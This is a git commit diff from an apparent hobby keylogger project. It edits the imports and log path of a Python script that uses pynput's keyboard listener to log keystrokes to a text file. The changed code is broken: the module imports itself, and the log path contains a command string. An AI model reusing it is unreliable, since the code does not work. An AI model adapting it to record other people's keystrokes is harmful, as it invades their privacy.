1b56e0c0b90c033584ee48a304a59b15f58bd415
sassanghz <sassanghazi@gmail.com>
2024-08-15 01:50:36 -0600

    file error managed

--- main.py
+++ main.py
@@ -1,8 +1,8 @@
-import pynput
+import main
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"C:\Users\sassa\OneDrive\Documents\GitHub\KeyLogger\pynput.py"
+log_dir = r"c:\python312\python.exe c:\Users\sassa\OneDrive\Documents\GitHub\KeyLogger\main.py"
 logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
